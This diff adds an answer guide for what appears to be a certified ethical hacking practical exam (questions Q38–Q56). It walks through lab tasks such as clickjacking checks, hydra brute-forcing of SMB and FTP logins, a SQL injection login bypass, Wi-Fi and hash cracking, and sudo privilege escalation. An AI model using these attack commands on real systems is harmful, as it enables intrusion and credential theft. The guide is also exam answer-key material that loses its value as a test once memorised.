@@ -1,0 +1,333 @@
+✅ Q38. Clickjacking Test – www.goodshopping.com
+🔍 What this question means
+
+Clickjacking occurs if a website can be loaded inside an iframe.
+
+🧪 STEP‑BY‑STEP
+Step 1: Check HTTP headers
+curl -I https://www.goodshopping.com
+
+
+Look for:
+
+X-Frame-Options
+
+Content-Security-Policy
+
+Step 2: Manual iframe test
+
+Create clickjack.html:
+
+<iframe src="https://www.goodshopping.com"></iframe>
+
+
+Open in browser.
+
+🔑 RESULT
+Condition	Result
+Page loads in iframe	Vulnerable
+Page blocked	Not Vulnerable
+✅ ANSWER FORMAT
+Yes / No
+
+✅ Q39. Session Hijacking – Identify Protocol
+🔍 Meaning
+
+Find which protocol was sniffed from sniffsession.pcap
+
+🧪 STEP‑BY‑STEP
+Step 1: Open PCAP
+wireshark sniffsession.pcap
+
+Step 2: Look for clear‑text sessions
+
+Apply filters:
+
+http
+ftp
+telnet
+
+Step 3: Check credentials in packets
+
+Right‑click → Follow → TCP Stream
+
+✅ ANSWER
+
+Protocol used for sniffing:
+
+HTTP / FTP / TEL
+
+✅ Q40. SMB Exploitation + Decryption
+🔍 Meaning
+
+Find SMB host
+
+Crack Henry’s credentials
+
+Download Sniff.txt
+
+Decode using Henry’s password
+
+🧪 STEP‑BY‑STEP
+Step 1: Identify SMB
+nmap -p 445 192.168.0.0/24
+
+Step 2: Crack SMB password
+hydra -l Henry -P passwords.txt smb://192.168.0.X
+
+Step 3: Access SMB
+smbclient //192.168.0.X/share -U Henry
+
+Step 4: Download file
+get Sniff.txt
+
+Step 5: Decode
+
+Use:
+
+Base64 / Caesar / XOR
+
+Password = Henry’s password
+
+✅ ANSWER
+
+Decoded text (only content)
+
+✅ Q41. Malicious ELF + Entropy + SHA‑384
+🔍 Meaning
+
+Find ELF files
+
+Identify highest entropy
+
+Extract last 4 chars of SHA‑384
+
+🧪 STEP‑BY‑STEP
+Step 1: Access mobile device (ADB)
+adb shell
+
+Step 2: Locate ELF files
+find / -name "*.elf"
+
+Step 3: Check entropy
+ent file.elf
+
+Step 4: Hash highest entropy file
+sha384sum file.elf
+
+✅ ANSWER
+
+Last 4 characters of hash
+
+✅ Q42. Nessus – End of Life Vulnerability
+🔍 Meaning
+
+Find EOL vulnerability severity score
+
+🧪 STEP‑BY‑STEP
+Step 1: Run Nessus scan
+
+Target:
+
+172.20.0.16
+
+Step 2: Filter vulnerabilities
+
+Search:
+
+End of Life
+
+Step 3: Note severity score
+
+Example:
+
+7.5
+
+✅ ANSWER
+NN
+
+✅ Q43. Linux Remote Login → NetworkPass.txt
+🧪 STEP‑BY‑STEP
+ssh user@192.168.0.X
+
+
+Search file:
+
+locate NetworkPass.txt
+
+
+or
+
+find / -name NetworkPass.txt 2>/dev/null
+
+
+Read:
+
+cat NetworkPass.txt
+
+✅ ANSWER
+
+File content
+
+✅ Q44. Steganography – MyTrip.jpg
+🧪 STEP‑BY‑STEP
+steghide extract -sf MyTrip.jpg
+
+
+Password:
+
+Imagination
+
+✅ ANSWER
+
+Extracted string
+
+✅ Q45. FTP Weak Credentials (Windows)
+
+Same process as Q36
+Use:
+
+hydra -l ftpuser -P passwords.txt ftp://192.168.0.X
+
+
+Login → Download Credential.txt
+
+✅ ANSWER
+
+File content
+
+✅ Q46. Ubuntu Privilege Escalation
+ssh smith@192.168.0.X
+
+
+Check sudo:
+
+sudo -l
+
+
+Escalate:
+
+sudo su
+
+
+Read:
+
+cat /root/imroot.txt
+
+✅ ANSWER
+
+File content
+
+✅ Q47. Malware Entry Point
+🧪 STEP‑BY‑STEP
+PEview.exe die-another-day
+
+
+or
+
+readelf -h die-another-day
+
+✅ ANSWER
+
+Entry point address
+
+✅ Q48. DDoS – Highest Packet Sender
+Statistics → Conversations → IPv4
+
+
+Sort by packet count
+
+✅ ANSWER
+
+Top IP address
+
+✅ Q49. SQLi – Sarah Password
+
+Login → Inject:
+
+' OR '1'='1
+
+
+Dump users table
+
+✅ ANSWER
+
+Sarah’s password
+
+✅ Q50. training.cehorg.com Exploit
+
+Use:
+
+Dirb
+
+Exploit known CVE
+
+Locate Flag.txt
+
+✅ ANSWER
+
+Flag content
+
+✅ Q51. SQLi – cybersec.cehorg.com
+
+Same SQLi steps
+Dump tables → Flag column
+
+✅ ANSWER
+
+Flag value
+
+✅ Q52. DVWA MD5 Crack
+type Hash.txt
+
+
+Copy hash → hashes.com
+
+✅ ANSWER
+
+Cracked text
+
+✅ Q53. IoT MQTT Publish
+
+Wireshark filter:
+
+mqtt
+
+
+Check:
+
+Publish → Message Length
+
+✅ ANSWER
+
+NN
+
+✅ Q54. Wireless Password
+aircrack-ng WirelessCapture.cap -w wordlist.txt
+
+✅ ANSWER
+
+Wi‑Fi password
+
+✅ Q55. RAT → sa_code.txt
+
+Access RAT GUI
+Browse files
+Retrieve file
+
+✅ ANSWER
+
+File content
+
+✅ Q56. VeraCrypt Decryption
+
+Crack hash:
+
+hashcat -m 1400 Key2Secret.txt wordlist.txt
+
+
+Mount volume → Read Confidential.txt
+
+✅ ANSWER
+
+Secret code
